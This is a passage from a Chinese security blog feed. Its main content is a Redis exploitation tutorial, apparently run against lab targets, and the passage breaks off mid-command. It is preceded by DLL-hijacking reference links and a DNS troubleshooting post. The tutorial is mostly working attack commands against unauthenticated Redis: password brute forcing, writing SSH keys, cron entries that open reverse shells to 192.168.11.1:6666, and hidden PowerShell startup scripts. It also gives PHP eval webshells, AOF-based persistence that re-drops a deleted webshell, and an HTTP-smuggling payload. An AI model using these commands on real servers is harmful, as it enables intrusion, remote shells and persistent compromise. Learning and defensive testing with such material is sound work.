href="https://security.tencent.com/index.php/blog/msg/20">TSRC博文</a>。</p><h2 id="0x10-参考链接"><a href="#0x10-参考链接" class="headerlink" title="0x10 参考链接"></a>0x10 参考链接</h2><p><a href="https://trustfoundry.net/what-is-dll-hijacking/">https://trustfoundry.net/what-is-dll-hijacking/</a><br><a href="https://payloads.online/archivers/2019-10-02/1/">https://payloads.online/archivers/2019-10-02/1/</a><br><a href="https://www.mandiant.com/resources/abusing-dll-misconfigurations">https://www.mandiant.com/resources/abusing-dll-misconfigurations</a><br><a href="https://resources.infosecinstitute.com/topic/dll-hijacking-attacks-revisited/">https://resources.infosecinstitute.com/topic/dll-hijacking-attacks-revisited/</a><br><a href="https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0">https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0</a><br><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking</a><br><a href="https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows">hijacking-dlls-in-windows-lists</a><br><a href="https://www.netspi.com/blog/technical/adversary-simulation/adaptive-dll-hijacking/">自适应DLL劫持</a><br><a href="https://blog.csdn.net/breaksoftware/article/details/8167641">DllMain中死锁问题分析</a><br><a href="https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order">动态链接库搜索顺序</a><br><a href="https://docs.microsoft.com/zh-CN/troubleshoot/windows-client/deployment/dynamic-link-library">什么是 DLL</a><br><a href="https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-libraries">动态链接库</a><br><a href="https://blog.csdn.net/liubing8609/article/details/82052769">声明导出函数的方式</a><br><a href="https://blog.51cto.com/wingeek/273929">使用.local重定向DLL 加载路径</a><br><a href="https://msrc-blog.microsoft.com/2018/04/04/triaging-a-dll-planting-vulnerability/">对 DLL 植入漏洞进行分类</a><br><a href="https://blog.csdn.net/breaksoftware/article/details/8150476">DllMain死锁分析</a><br><a href="https://securityintelligence.com/posts/hunting-evidence-dll-side-loading-powershell-sysmon/">使用 PowerShell 和 Sysmon 寻找 DLL 侧加载的证据</a><br><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/privilege-escalation/untitled-2/dll-side-loading">red-team-notes-2-0</a><br><a href="https://www.picussecurity.com/resource/blog/revil-sodinokibi-ransomware-kaseya-vsa-msp-supply-chain-attack">Kaseya MSP 供应链攻击分析</a><br><a href="https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0">自动发现 DLL 劫持</a><br><a href="https://github.com/XForceIR/SideLoadHunter">Sysmon-SideLoadHunter</a><br><a href="https://attack.mitre.org/techniques/T1574/001/">DLL 搜索顺序劫持</a><br><a href="https://attack.mitre.org/techniques/T1574/002/">DLL 侧加载</a> </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows DLL劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次HSTS警告的排查</title>
      <link href="/2021/11/03/yi-ci-hsts-jing-gao-de-pai-cha/"/>
      <url>/2021/11/03/yi-ci-hsts-jing-gao-de-pai-cha/</url>
      
        <content type="html"><![CDATA[<p>最近访问博客发现页面显示不正常，F12查看网络情况后发现cloudflare加载的静态资源出了问题，具体表现为浏览器出现HSTS警告，使用socks5代理时正常(使用socks5代理时，DNS查询也是用的socks5代理)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/8b94cbff2e08e006ece6906503dbff0c.png"><br>查看证书发现证书是vmware.com的，安装了VM虚拟机后在本地443端口有这个服务：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/733862ea7c649072c2fed9374aa7e9ce.png"><br>猜测是DNS出了问题，cloudflare被解析到了127.0.0.1上，使用ping和nslookup查看解析情况：</p><pre><code class="stylus">ping cdnjs.cloudflare.com</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/981791cbfa078c9f58475d707fb610a1.png"></p><pre><code class="stylus">nslookup cdnjs.cloudflare.com</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/552c8f3656ae2571bdbb9b3592508f2c.png"></p><p>这里的DNS服务器是路由器上的，都将cloudflare.com解析到了本地，手动设置一下主备DNS服务器分别为<code>114.114.114.114</code>，<code>8.8.8.8</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/dd7bf0921433d43070082305540612bf.png"></p><p>这样一来就可以正常访问了：</p><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/60d887c133cf51126441870b6d82c9ab.png"></p><p>后来使用有线网络时又出现了上面的情况，但是这时候设置IPV4的DNS没有效果，nslookup查询时地址为 IPV6的本地地址fe80::1 ，似乎是IPV6：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/bfacabde78f9e74262af8ddd529f4e30.png"><br>怎么变成了IPV6解析了，按计划设置下IPV6的DNS服务器：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/9c4120d3e0031386528f1fdafef2299e.png"><br>一些百度、阿里的IPV6 DNS：</p><pre><code class="python">2400:3200::12400:3200:baba::12400:da00::66662001:4860:4860::8888 2001:4860:4860::8844</code></pre><p>配置完成后解析成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/53ff4226815e7904098e3abb7446cdae.png"></p><p>或者可以将IPV6关闭，这样就直接使用IPV4的DNS解析了：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_11/fa529d3238eb58c9ee8ec1a94140aa6e.png"></p><p>设置完成后如果不生效可以使用 <code>ipconfig /flushdns</code> 刷新本地DNS缓存。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS解析配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis漏洞利用</title>
      <link href="/2021/10/09/redis-lou-dong-li-yong/"/>
      <url>/2021/10/09/redis-lou-dong-li-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Redis 是一种开源、基于内存的数据结构存储，被用作数据库、缓存和消息代理。其在低版本(&lt;3.2.0 ，从 3.2.0 版本开始，当 Redis 使用默认配置（绑定所有接口）并且没有任何密码来访问它时，它会进入一种称为保护模式的特殊模式。在这种模式下，Redis 只回复来自环回接口的查询，并回复从其他地址连接的客户端有错误，解释发生了什么以及如何正确配置 Redis。)上默认配置绑定在0.0.0.0:6379上且未设置密码验证，导致未授权访问，可结合其他命令组合获取权限。Redis安全性介绍 <a href="https://redis.io/topics/security">https://redis.io/topics/security</a> 。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>环境根据需要选择，Ubuntu/Centos/Windows下环境搭建可以参考下列记录：</p><h3 id="Redis连接-管理工具"><a href="#Redis连接-管理工具" class="headerlink" title="Redis连接/管理工具"></a>Redis连接/管理工具</h3><p>1.链接工具包括<a href="https://redis.io/topics/rediscli">Redis-cli</a>和打包好的二进制<a href="https://github.com/yanghaoi/exploits/tree/master/Redis">管理工具</a>。Redis-cli是Redis的默认连接工具，安装完成后自带。其命令格式为<code>redis-cli -h host -p port -a password command</code>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d8404e2e7e21ff91cb8d5c33e8bb6162.png"></p><p>2.<a href="https://github.com/caoxinyu/RedisClient">RedisClient</a> 是一个带GUI的管理工具，有exe和Jar包两种可执行文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b9c3e605076e53db04eacead51fa9d22.png"></p><p>3.<a href="https://github.com/lloy1231/RedisDesktopManager-Windows">redis-desktop-manager</a> 是开源的可视化工具，但是新版本的安装包需要付费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/832c0d96d1647bc1aa55340600d03ca9.png"></p><p>4.<a href="https://github.com/qishibo/AnotherRedisDesktopManager">AnotherRedisDesktopManager</a>，这是另一个可视化管理工具，开源免费：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f198fabfa3bbec5e98742d65133b75af.png"></p><p>5.其他方式<br>其他还可以用NC工具来连接使用。甚至在未授权的情况下还可以用python的urllib2模块的http请求走私特性利用：</p><pre><code class="python"># -*- coding:utf-8 -*-import urllib2url = "http://127.0.0.1:6379?info HTTP/1.1\r\nflushall\r\nconfig set dir C:/\r\nconfig set dbfilename shell.php\r\nset 'webshell' '&lt;?php phpinfo();exit(666);?&gt;'\r\nsave\r\nQUIT\r\na:a\r\n\r\n"htmlpage = urllib2.urlopen(url).read()print(htmlpage)</code></pre><h3 id="Redis-Install-For-Linux"><a href="#Redis-Install-For-Linux" class="headerlink" title="Redis Install For Linux"></a>Redis Install For Linux</h3><p>在Linux上安装Redis，一般以源码编译方式安装，源码详见：<a href="https://github.com/redis/redis">Redis仓库</a>     <a href="https://redis.io/download">官网下载地址</a> 。<br>环境搭建首先以源码编译安装的方式在Linux下搭建3.2.0来验证默认配置下的保护模式，然后安装3.0.7版本在默认配置下进行利用，最后安装4.x/5.x/6.x配置未授权进行利用。</p><p>1.先安装下3.2.0版本，观察在3.2.0的默认配置下是否如官网描述的安全性情况：</p><pre><code class="shell">$ wget https://download.redis.io/releases/redis-3.2.0.tar.gz$ tar xzf redis-3.2.0.tar.gz$ cd redis-3.2.0$ make$ cd src &amp;&amp; ./redis-server</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ed7c038d7978ce468ce1d0ef7baea7cc.png"><br>这时候使用外部IP连接时果然会提示，所以在Linux版本&gt;=3.2.0以上没有手动配置绑定在外部IP上的话是不能远程利用的(所以后面的需要在配置文件redis.conf中手动配置<code>protected-mode no</code>和<code>bind 0.0.0.0</code>)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f0d65cdb6884b0218f0c93ec285a0b18.png"></p><p>2.安装3.0.7(&lt;3.2.0最近的就是这个了)：</p><pre><code class="shell">$ wget https://download.redis.io/releases/redis-3.0.7.tar.gz$ tar xzf redis-3.0.7.tar.gz$ cd redis-3.0.7$ make$ cd src &amp;&amp; ./redis-server</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c897142bf1526e1e2e2b349066881acb.png"></p><p>3.Redis6.2.6安装</p><pre><code class="shell">$ wget https://download.redis.io/releases/redis-6.2.6.tar.gz$ tar xzf redis-6.2.6.tar.gz$ cd redis-6.2.6$ make$ cd src &amp;&amp; ./redis-server</code></pre><p>修改默认配置文件关闭保护模式并绑定IP（<code>bind 0.0.0.0 ，protected-mode no</code>）:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/1b3d18fc3a70f386bc757c326cc141d7.png"><br>加载配置文件启动<code>./redis-server ../redis.conf</code>：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f226ac8aaadcc072a6caf5ac22e8e01e.png"></p><p>4.Docker 环境<br><a href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">vulhub</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ed8fb9d44d975a36d16033f3a26f3ab3.png"></p><p><a href="https://hub.docker.com/_/redis">dockerhub-redis</a><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/792704d7190b0d603cb165a695c2f52d.png"></p><pre><code class="bash">docker pull redis:5-bullseye</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9c73d5c602c38d59d9e96092e13ca56e.png"></p><h3 id="Dockerhub-CentOS"><a href="#Dockerhub-CentOS" class="headerlink" title="Dockerhub-CentOS"></a>Dockerhub-CentOS</h3><p>使用Docker在CentOS容器内部署PHPStudy和Redis环境：</p><pre><code class="python">docker pull centos:latestdocker run -tid --name centos_1 -p 6379:6379 -p 18080:18080 -p 8081:8080 -p 8082:80 -p 9080:9080 -p 2222:22 --privileged=true centos:latest /sbin/inityum install crontabs   #安装计划任务服务systemctl enable crond #设为开机启动systemctl start crond  #启动crond服务systemctl status crond #查看状态yum install wget#下载编译好的redis-server到CentOSwget http://xxx/redis-server &amp;&amp; chmod +x redis-server &amp;&amp; ./redis-server#opensshyum install openssh*systemctl enable sshd systemctl start sshd#phpstudy，内置了很多软件安装yum install -y wget &amp;&amp; wget -O install.sh https://notdocker.xp.cn/install.sh &amp;&amp; sh install.sh请用浏览器访问面板:外网:http://171.212.137.205:9080/B3A929内网:http://172.17.0.3:9080/B3A929系统初始账号:admin系统初始密码:hLQGQ6HGP9#ssh -fgN -L 8080:localhost:80 localhost</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9345d24c4c1123f0a84def9d60eef471.png"></p><h3 id="Redis-Install-For-Windows"><a href="#Redis-Install-For-Windows" class="headerlink" title="Redis Install For Windows"></a>Redis Install For Windows</h3><p>Windows版本安装包的更新没有Linux那么及时，需要自行编译源码或者使用其他已编译的版本：<a href="https://github.com/dmajkic/redis/downloads">Redis&lt;2.4.5</a> ， <a href="https://www.xp.cn/download.html">PHPStudy-Redis3.0.504</a> ， <a href="https://github.com/microsoftarchive/redis/releases">Redis-x64-3.2.100.msi</a>，<a href="https://github.com/tporadowski/redis/releases">Redis 5.0.14</a> 。<br>常用的PHPStudy-Redis3.0.504：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/4a64eea99d9856ecf4545f935aff74ac.png"><br>Redis-xx.msi安装后会以服务形式启动：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/eb11327e4b205370d64d7e2b55e1cb7e.png"></p><p>以服务形式启动的默认会加载<code>redis.windows-service.conf</code>，命令行启动的可以手动指定：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/dff88acf2fc35cc9d7c2216dc9cc7b72.png"><br>同样的修改配置文件以允许外部链接：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/df0bb9ebda1c49f38f50fb9ddf626fa7.png"></p><h2 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h2><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p><strong>Dict协议</strong></p><pre><code class="python">dict://192.168.200.97:6379/auth:password</code></pre><p><strong>Metasploit模块</strong></p><pre><code class="python">use auxiliary/scanner/redis/redis_loginset rohosts 192.168.11.133run</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9abaff419efd5fc973b2dc0cff95f28.png"></p><p><strong>Hydra</strong></p><pre><code class="stylus">hydra -P redis_pass.txt redis://192.168.11.133</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/bd5f9c678d6039c2e3f460c025ca20a3.png"></p><p><strong>超级弱口令工具</strong><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/6de20cd9b8d9e90a395bc957b2b20b2a.png"></p><h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>主要是利用一些命令获取信息，获取客户端连接信息： <code>CLIENT LIST</code><br> <img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/b84eb1177fba33809271c0dd872b5e99.png"><br> 探测文件是否存在(&gt;2.6.0)：<code>EVAL "return dofile('C:/Users/yanghao/NTUSER.DAT')" 0</code><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fe9fd97c62e0cc0443e241422100b2fc.png"></p><pre><code class="python">#检测 redis 服务是否启动ping#查看是否设置了密码验证CONFIG get requirepass#设置密码为runoobAUTH "runoob"#获取 Redis 服务器的各种信息和统计数值INFO#查询配置参数CONFIG GET#设置配置参数CONFIG STE#设置KEY"runoobkey"的值为redis SET runoobkey redis#删除KEY"runoobkey"DEL runoobkey#在后台异步保存当前数据库的数据到磁盘BGSAVE#返回当前数据库的 key 的数量DBSIZE#让 Redis 服务崩溃DEBUG SEGFAULT#删除所有数据库的所有keyFLUSHALL#删除当前数据库的所有keyFLUSHDB#返回最近一次 Redis 成功将数据保存到磁盘上的时间，以 UNIX 时间戳格式表示LASTSAVE#设置远程主服务器SLAVEOF host port / REPLICAOF host port #断开主从连接SLAVEOF ON ONE</code></pre><h3 id="Ridis持久化-数据集备份-利用"><a href="#Ridis持久化-数据集备份-利用" class="headerlink" title="Ridis持久化(数据集备份)利用"></a>Ridis持久化(数据集备份)利用</h3><p><a href="https://redis.io/topics/persistence">Redis持久化</a>是指可以将数据集保存到本地磁盘中的操作，有RDB和AOF两种方式。通过数据备份操作将数据写入到磁盘中进行利用，但是某些格式写入数据的会包含Redis备份的标记存在脏数据，这只能用于一些有容错性的文件利用。</p><h4 id="RDB备份文件利用"><a href="#RDB备份文件利用" class="headerlink" title="RDB备份文件利用"></a>RDB备份文件利用</h4><p>基础的命令如下：</p><pre><code class="python">DBSIZE                   # 统计KEYSflushall                  # 如果键过多导致备份过大，全部清空KEYS(危险)CONFIG GET slave-read-only      # 查询只读配置CONFIG SET slave-read-only no    # 关闭只读配置CONFIG GET DIR              # 查询目录CONFIG SET dir /path/www/html    # 修改备份目录  CONFIG GET dbfilename         # 查询备份文件名，方便恢复CONFIG SET dbfilename trojan.php  # 修改备份文件名为我们的shell名SET trojan "&lt;?php phpinfo(); ?&gt;"  # 设置KEY和值BGSAVE  / SAVE              # 异步/阻塞 保存当前数据库的数据到磁盘DEL trojan                 #删除恶意键          恢复：CONFIG SET dir /usr/local/redis   #恢复原来的目录CONFIG SET dbfilename dump.rdb   # 恢复原来的备份文件</code></pre><h5 id="Linux写SSH公钥"><a href="#Linux写SSH公钥" class="headerlink" title="Linux写SSH公钥"></a>Linux写SSH公钥</h5><p><em>需要有对应用户目录的写入权限且ssh服务可以连接并开启了公钥登录，在Ubuntu上用Redis3.0.7测试</em><br>生成密钥对： <code>ssh-keygen -t rsa</code><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/ee761b74f8d31b1b0843204eea9ec020.png"><br>在id_rsa.pub文件中首尾加上换行(复制完记得改回去)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9e74eff4168d783708cb94706a97d09a.png"><br>执行下列命令</p><pre><code class="python">config set dir /root/.sshconfig set dbfilename authorized_keysset authorized_keys "id_rsa.pub的内容"bgsave</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a88d17df4b2feb84d5ba54c964384dd3.png"><br>查看靶机已经写入成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/d71634977764e04614840a94d832ea2d.png"><br>登录成功：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9a696a39954a3c85bcc4f66dd9d2ad0.png"></p><h5 id="Linux写计划任务"><a href="#Linux写计划任务" class="headerlink" title="Linux写计划任务"></a>Linux写计划任务</h5><p>Linux下操作计划任务需要root权限。<a href="https://www.thegeekdiary.com/centos-rhel-begginners-guide-to-cron/">计划任务介绍</a> <a href="https://zh.wikipedia.org/wiki/Cron#crontab%E6%96%87%E4%BB%B6">crontab文件</a></p><p><code>/etc/crontab</code>和<code>/etc/cron.*</code>目录下的任务时间表（crontabs）文件是系统层次的，格式如下：</p><pre><code class="bash"># 文件格式说明# ┌──分钟（0 - 59）# │ ┌──小时（0 - 23）# │ │ ┌──日（1 - 31）# │ │ │ ┌─月（1 - 12）# │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）# │ │ │ │ │# *  *  *  *  *  用户名 执行的命令</code></pre><p>系统层次的任务时间表（crontabs）的任务经常会指定一个或以上的用户进行执行，因此任务时间表（crontabs）文件需要增加“用户名”字段。<code>/etc/crontab</code> 文件定期自动执行多个子目录中的项目。放置在不同目录中<code>/etc/cron.*</code>脚本按照下面给出的时间间隔运行。这些目录中的所有脚本都以 root 权限运行。</p><table><thead><tr><th>目录</th><th>时间</th><th>权限</th></tr></thead><tbody><tr><td>/etc/cron.d</td><td>几分钟</td><td>root</td></tr><tr><td>/etc/cron.hourly</td><td>每小时的第一分钟</td><td>root</td></tr><tr><td>/etc/cron.daily</td><td>每天凌晨 3:05 至晚上 10.55</td><td>root</td></tr><tr><td>/etc/cron.weekly</td><td>自上次执行后 7 天后的上午 3:25 至晚上 11:10 之间</td><td>root</td></tr><tr><td>/etc/cron.monthly</td><td>自上次执行后一个月后的凌晨 3:45 至晚上 11:30 之间</td><td>root</td></tr></tbody></table><p><code>/var/spool/cron/</code>下的任务时间表（crontab）文件是用户层次的（但是只能root权限建），计划任务文件的名称与用户的用户名相同，格式如下：</p><pre><code class="bash"># 文件格式说明# ┌──分钟（0 - 59）# │ ┌──小时（0 - 23）# │ │ ┌──日（1 - 31）# │ │ │ ┌─月（1 - 12）# │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）# │ │ │ │ │# *  *  *  *  * 被执行的命令</code></pre><p>由于Ubuntu的计划任务不能容错，语法会进行严格检查:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2c504bdb7af9d8e9b5c186a817c25768.png"><br>所以写计划任务用到了Docker搭建CentOS环境来测试，Redis命令写入计划任务文件夹<code>/etc/cron.d</code>：</p><pre><code class="bash">config set dir /etc/cron.dconfig set dbfilename xset x "\n\nSHELL=/bin/bash\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n"#set x "\n\n* * * * * ftp bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n"save</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/a01700f56255272f2e5657941c08f9f3.png"></p><p>写入 <code>/var/spool/cron/</code>：</p><pre><code class="bash">FLUSHALLconfig set dir /var/spool/cronconfig set dbfilename bin  # 以用户名命名文件set x "\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.11.1/6666 0&gt;&amp;1\n\n"save</code></pre><p>反弹回bin用户的shell:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c5f026052faf1c2c331f8c88d055d30a.png"></p><h5 id="Windows写启动项"><a href="#Windows写启动项" class="headerlink" title="Windows写启动项"></a>Windows写启动项</h5><p>通过文件写入启动项后，在系统重启后执行脚本，主要是写.bat .cmd等支持容错的文件执行其他命令(powershell、mshta、regsvr32等等)来利用(windows下换行<code>\r\n</code>)：</p><pre><code class="python"># 这是系统启动项，如果权限不足时利用set dir或EVAL "return dofile"目录/文件探测方式去找用户启动目录config set dir "C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp" config set dbfilename info.batset x "\r\n\r\npowershell.exe -nop -w hidden -enc xxxxx\r\n\r\n"save</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/744be6544214bae378f65fce5ee066d8.png"></p><h5 id="Windows文件覆盖"><a href="#Windows文件覆盖" class="headerlink" title="Windows文件覆盖"></a>Windows文件覆盖</h5><p>有时候目标服务器一直不会重启，那么可以考虑覆盖一些其他的bat文件等来增加触发几率，可以利用<code>EVAL "return dofile('xxx') 0</code>探测文件是否真的存在。PHPStudy环境中的bat文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9e48cf26937d98b3a102eb6b412dd96b.png"><br>通过Redis默认的dir参数可以知道绝对路径：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/0b77db0e5556150ce63a48b52033dc8a.png"><br>比如覆盖Apache下的check.bat脚本(如果触发后就会执行命令):</p><pre><code class="python">config set dir "D:/phpstudy_pro/Extensions/Apache2.4.39/bin"config set dbfilename check.batset x "\r\n\r\nhttpd.exe\r\ncmd /c calc\r\npause &gt; nul\r\n"save</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/fc91a408ddc88709de58aba050248a44.png"></p><h5 id="WEB绝对路径写Wbeshell"><a href="#WEB绝对路径写Wbeshell" class="headerlink" title="WEB绝对路径写Wbeshell"></a>WEB绝对路径写Wbeshell</h5><p>如果Redis环境中同时存在WEB环境，在Redis权限比较高的情况下，可以尝试获取到绝对路径后写入Webshell，一般以二进制文件启动的程序是启动用户的权限，比较适合利用，以安装服务(yum install redis)等启动的权限会比较有限。</p><p>Windows+PHPStudy:</p><pre><code class="python">config set dir "D:/phpstudy_pro/WWW" config set dbfilename redisshell.phpset x "\r\n\r\n&lt;?php eval($_GET[1]);?&gt;\r\n\r\n"save</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f9bae99834a2ca2f2665c1b9b660413d.png"></p><p>在CentOS+PHPStudy下：</p><pre><code class="python">config set dir "/var/www/html" config set dbfilename redisshell.phpset x "\n\n&lt;?php eval($_GET[1]);?&gt;\n\n"save</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2ef26d7345cd7a1e6e20a88abe52e49e.png"></p><p>Centos + Apache下:</p><pre><code class="python">config set dir "/var/www/html" config set dbfilename redisshell.phpset x "\n\n&lt;?php eval($_GET[1]);?&gt;\n\n"save</code></pre><p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f8df2ca875ec434336e7d9fd60513394.png"><br>如果权限不足，无法写入：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2e23b73f321efe0a5d5a5fbba526a674.png"></p><h4 id="AOF-配置重写持久化"><a href="#AOF-配置重写持久化" class="headerlink" title="AOF+配置重写持久化"></a>AOF+配置重写持久化</h4><p>由于不能设置appendfilename参数，不能AOF写任意后缀文件。但是可以通过该方式进行权限维持，在配置文件开启AOF后，Redis在重启后会执行其中的命令以恢复数据，结合配置文件重写达到redis在重启后写入webshell的效果(save之类的命令不会被aof记录)，执行命令：</p><pre><code class="python">#每秒保存命令（如果已经在默认位置存在aof文件，就使用该配置保存命令，不要使用bgrewriteaof，redis会优先恢复默认目录的aof,用该命令控制写入aof的内容即可。）#config set appendfsync everysec#关闭只读CONFIG SET slave-read-only no      #设置持久化数据保存目录config set dir "D:/phpstudy_pro/WWW/Redis"   #设置RDB文件名config set dbfilename redisshell.php  #设置一个keyset x "\r\n\r\n&lt;?php eval($_GET[1]);?&gt;\r\n\r\n"   #设置aof增长重写幅度，1kb涨到1.5kb就重写config set auto-aof-rewrite-percentage 50#设置AOF文件最小重写的大小（字节）。第一次达到1mb就重写config set auto-aof-rewrite-min-size 10000#表示10秒内如果至少有 1 个 key 的值变化，则保存rdbconfig set save "10 1"   #将内存中执行的命令保存到aof文件 bgrewriteaof #开启AOF持久化config set appendonly yes #重写配置CONFIG REWRITE                       </code></pre><p>由于在10秒内设置了key,触发保存规则，写入了PHP文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/f89cc1a5cae127346a6582c753dea373.png"><br>模拟管理员删除PHP文件、然后重启Redis、Redis工作后的键写入:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/db05612d3c4eae8e9499a12e2bf884d5.gif"></p><h3 id="主从复制无损写文件-master-slave模式"><a href="#主从复制无损写文件-master-slave模式" class="headerlink" title="主从复制无损写文件(master/slave模式)"></a>主从复制无损写文件(master/slave模式)</h3><p>Redis&gt;=2.8，支持主从复制功能，通过主从复制Redis-slave会将Redis-master的数据库文件同步到本地。攻击者可以伪造一个master，通过控制数据库文件可以在slave中写入无损的文件。利用命令来设置主服务器<code>SLAVEOF host port / REPLICAOF host port</code>(REPLICAOF &gt; 5.0.0) ，执行命令后的Redis身份会切换为从服务器，然后通过与主服务器交互进行数据同步，但是会导致目标Redis数据丢失，可以使用<a href="https://www.cnblogs.com/yanjieli/p/13085481.html">redis-dump</a>、redis-load等第三方工具进行数据备份导出，也可以在目标Redis上设置rdb、aof备份。利用 <a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 脚本模拟master测试利用(需要网络互通,否则脚本会卡在从机连接位置)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/44800dff8965ebaa84c88b226962fb81.png"></p><h4 id="Linux写SSH公钥-1"><a href="#Linux写SSH公钥-1" class="headerlink" title="Linux写SSH公钥"></a>Linux写SSH公钥</h4><pre><code class="python">python3 RedisWriteFile.py --rhost 192.168.11.133 --rport 6379 --lhost 192.168.11.1 